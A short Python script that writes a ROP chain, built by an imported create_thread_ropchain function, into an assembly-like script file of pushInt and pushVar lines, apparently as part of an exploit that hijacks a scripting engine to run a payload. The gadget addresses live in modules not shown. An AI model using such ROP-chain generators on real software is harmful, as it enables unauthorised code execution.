from tcp_ropchain import *
from PayloadAddress import *

CHAIN_END = "#Execute ROP chain\nexit\n\n#Dunno why but I figured I might as well put it here, should never hit this though\nend"

def write_rop_chain(rop_chain, path):
    with open('rop_setup.s', 'r') as f:
        setup = f.read()
    with open(path, 'w') as f:
        print(setup, file=f)
        for command in rop_chain:
            if isinstance(command, PayloadAddress):
                print("pushVar. globalVar,mscScriptAddress", file=f)
            elif isinstance(command, int):
                print(f"pushInt. {hex(command)}", file=f)
            else:
                raise Exception(f"Found invalid type {type(command)} in rop_chain")
        print(CHAIN_END, file=f)

def main():
    rop_chain = create_thread_ropchain(PayloadAddress())
    write_rop_chain(rop_chain, 'main.s')

if __name__ == "__main__":
    main()
